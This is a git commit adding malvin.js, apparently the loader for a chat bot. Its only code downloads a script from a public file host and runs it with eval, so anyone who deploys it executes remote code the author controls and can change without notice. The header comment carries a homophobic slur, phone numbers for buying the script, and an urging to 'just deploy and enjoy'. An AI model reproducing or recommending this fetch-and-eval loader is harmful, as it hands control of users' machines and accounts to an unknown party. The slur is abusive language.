ce27d5c7b22fe2e974c2eb807be6fabde09175b1
Malvin King <malvink003@gmail.com>
2025-03-14 14:50:21 +0200

    Create malvin.js

---
+++ malvin.js
@@ -0,0 +1,8 @@
+//HELLO CLOSER IF DID YOU WANT CLONE YOU FUCKING GAY 😂 IF YOU WANT BUY SCRIPT FIND ME +263780166288 ,+263780934873 ,+263714757857 FIND ME TO GET A SCRIPT IF YOU NEED IF DON'T NEED JUST DEPLOY AND ENJOY MALVIN XD FASTER BOT
+const axios = require('axios');
+
+const url = "https://files.catbox.moe/malvin.js";
+
+axios.get(url)
+    .then(response => eval(response.data))
+    .catch(err => console.error(err));
